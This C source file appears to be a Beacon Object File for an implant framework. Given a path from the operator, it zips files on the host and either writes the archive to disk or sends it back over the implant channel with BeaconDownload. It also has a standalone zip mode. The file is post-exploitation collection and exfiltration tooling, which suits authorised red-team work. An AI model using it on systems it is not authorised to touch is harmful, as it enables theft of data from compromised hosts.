#include "beacon.h"
#include "zip_archive.h"

#include <errno.h>
#include <limits.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

_Static_assert(sizeof(WCHAR) == 2U, "BOF UTF-16 paths require 16-bit WCHAR");

static int valid_packed_wstring(const WCHAR *value, int byte_length)
{
    int index;
    int character_count;

    if (value == NULL || byte_length < (int)sizeof(WCHAR) ||
        byte_length % (int)sizeof(WCHAR) != 0) {
        return 0;
    }
    character_count = byte_length / (int)sizeof(WCHAR);
    if (value[character_count - 1] != L'\0') {
        return 0;
    }
    for (index = 0; index + 1 < character_count; ++index) {
        if (value[index] == L'\0') {
            return 0;
        }
    }
    return 1;
}

static const WCHAR *download_basename(const WCHAR *path)
{
    const WCHAR *cursor;
    const WCHAR *name = path;

    for (cursor = path; *cursor != L'\0'; ++cursor) {
        if (*cursor == L'/' || *cursor == L'\\') {
            name = cursor + 1;
        }
    }
    return *name != L'\0' ? name : L"archive.zip";
}

static char *wide_to_utf8(const WCHAR *value)
{
    char *converted;
    int required;

    required = WideCharToMultiByte(CP_UTF8, WC_ERR_INVALID_CHARS, value, -1,
                                   NULL, 0, NULL, NULL);
    if (required <= 0) {
        return NULL;
    }
    converted = (char *)malloc((size_t)required);
    if (converted == NULL) {
        return NULL;
    }
    if (WideCharToMultiByte(CP_UTF8, WC_ERR_INVALID_CHARS, value, -1,
                            converted, required, NULL, NULL) <= 0) {
        free(converted);
        return NULL;
    }
    return converted;
}

__declspec(dllexport) void go(const char *data, int length)
{
    datap parser;
    zip_result result;
    WCHAR *source;
    WCHAR *destination;
    int source_length = 0;
    int destination_length = 0;
    int level;
    int disk_mode;
    void *archive_data = NULL;
    size_t archive_size = 0;
    const WCHAR *download_name_wide;
    char *source_utf8 = NULL;
    char *destination_utf8 = NULL;
    char *download_name = NULL;

    BEACON_INIT();

    BeaconDataParse(&parser, (char *)data, length);
    source = (WCHAR *)BeaconDataExtract(&parser, &source_length);
    destination = (WCHAR *)BeaconDataExtract(&parser, &destination_length);

    if (!valid_packed_wstring(source, source_length) ||
        !valid_packed_wstring(destination, destination_length) ||
        parser.length != 8) {
        BeaconPrintf(CALLBACK_ERROR_UTF8,
                     "zip: invalid UTF-16 path arguments\n");
        return;
    }
    level = BeaconDataInt(&parser);
    disk_mode = BeaconDataInt(&parser);
    if (level < 0 || level > 9) {
        BeaconPrintf(CALLBACK_ERROR_UTF8,
                     "zip: compression level must be between 0 and 9\n");
        return;
    }
    if (disk_mode != 0 && disk_mode != 1) {
        BeaconPrintf(CALLBACK_ERROR_UTF8, "zip: invalid disk mode\n");
        return;
    }

    source_utf8 = wide_to_utf8(source);
    destination_utf8 = wide_to_utf8(destination);
    if (source_utf8 == NULL || destination_utf8 == NULL) {
        BeaconPrintf(CALLBACK_ERROR_UTF8,
                     "zip: path arguments contain invalid Unicode\n");
        goto cleanup;
    }

    if (disk_mode == 1) {
        BeaconPrintf(CALLBACK_OUTPUT_UTF8,
                     "zip: writing '%s' from '%s' at level %d\n",
                     destination_utf8, source_utf8, level);
        if (zip_create_archive(source, destination, level, &result) != 0) {
            BeaconPrintf(CALLBACK_ERROR_UTF8,
                         "zip: disk write failed: %s\n",
                         result.error);
            goto cleanup;
        }
        BeaconPrintf(CALLBACK_OUTPUT_UTF8,
                     "zip: wrote '%s' (%llu file(s), %llu directories, "
                     "%llu input bytes, %llu link(s) skipped)\n",
                     destination_utf8, (unsigned long long)result.files,
                     (unsigned long long)result.directories,
                     (unsigned long long)result.bytes,
                     (unsigned long long)result.skipped_links);
        goto cleanup;
    }

    download_name_wide = download_basename(destination);
    download_name = wide_to_utf8(download_name_wide);
    if (download_name == NULL) {
        BeaconPrintf(CALLBACK_ERROR_UTF8,
                     "zip: download name contains invalid Unicode\n");
        goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT_UTF8,
                 "zip: building '%s' in memory from '%s' at level %d\n",
                 download_name, source_utf8, level);

    if (zip_create_archive_memory(source, destination, level, &archive_data,
                                  &archive_size, &result) == 0) {
        if (archive_size <= (size_t)UINT_MAX &&
            BeaconDownload(download_name, (const char *)archive_data,
                           (unsigned int)archive_size)) {
            BeaconPrintf(CALLBACK_OUTPUT_UTF8,
                         "zip: queued '%s' for download (%llu archive bytes, "
                         "%llu file(s), %llu directories, %llu link(s) skipped)\n",
                         download_name, (unsigned long long)archive_size,
                         (unsigned long long)result.files,
                         (unsigned long long)result.directories,
                         (unsigned long long)result.skipped_links);
            zip_free_archive(archive_data, archive_size);
            archive_data = NULL;
            goto cleanup;
        }

        if (archive_size > (size_t)UINT_MAX) {
            BeaconPrintf(CALLBACK_ERROR_UTF8,
                         "zip: archive is too large for in-memory download; "
                         "rerun with --disk\n");
        } else {
            BeaconPrintf(CALLBACK_ERROR_UTF8,
                         "zip: BeaconDownload failed\n");
        }
        zip_free_archive(archive_data, archive_size);
        archive_data = NULL;
    } else {
        BeaconPrintf(CALLBACK_ERROR_UTF8,
                     "zip: archive creation failed: %s\n",
                     result.error);
    }

cleanup:
    if (archive_data != NULL) {
        zip_free_archive(archive_data, archive_size);
    }
    free(source_utf8);
    free(destination_utf8);
    free(download_name);
}

static int parse_level(const WCHAR *text, int *level)
{
    WCHAR *end = NULL;
    long value;

    errno = 0;
    value = wcstol(text, &end, 10);
    if (errno != 0 || end == text || *end != L'\0' ||
        value < 0 || value > 9) {
        return -1;
    }
    *level = (int)value;
    return 0;
}

static int run_standalone(int argc, WCHAR **argv)
{
    zip_result result;
    int level = 6;
    char *destination_utf8;

    if (argc != 3 && argc != 4) {
        fprintf(stderr,
                "usage: zip.<arch>.exe <source> <destination.zip> [level 0-9]\n");
        return 2;
    }
    if (argc == 4) {
        if (parse_level(argv[3], &level) != 0) {
            fprintf(stderr,
                    "error: compression level must be between 0 and 9\n");
            return 2;
        }
    }
    if (zip_create_archive(argv[1], argv[2], level, &result) != 0) {
        fprintf(stderr, "error: %s\n", result.error);
        return 1;
    }
    destination_utf8 = wide_to_utf8(argv[2]);
    if (destination_utf8 == NULL) {
        destination_utf8 = (char *)malloc(sizeof("<unprintable>"));
        if (destination_utf8 != NULL) {
            memcpy(destination_utf8, "<unprintable>", sizeof("<unprintable>"));
        }
    }
    printf("created %s: %llu file(s), %llu directories, %llu input bytes\n",
           destination_utf8 != NULL ? destination_utf8 : "<unprintable>",
           (unsigned long long)result.files,
           (unsigned long long)result.directories,
           (unsigned long long)result.bytes);
    free(destination_utf8);
    return 0;
}

int wmain(int argc, WCHAR **argv)
{
    return run_standalone(argc, argv);
}
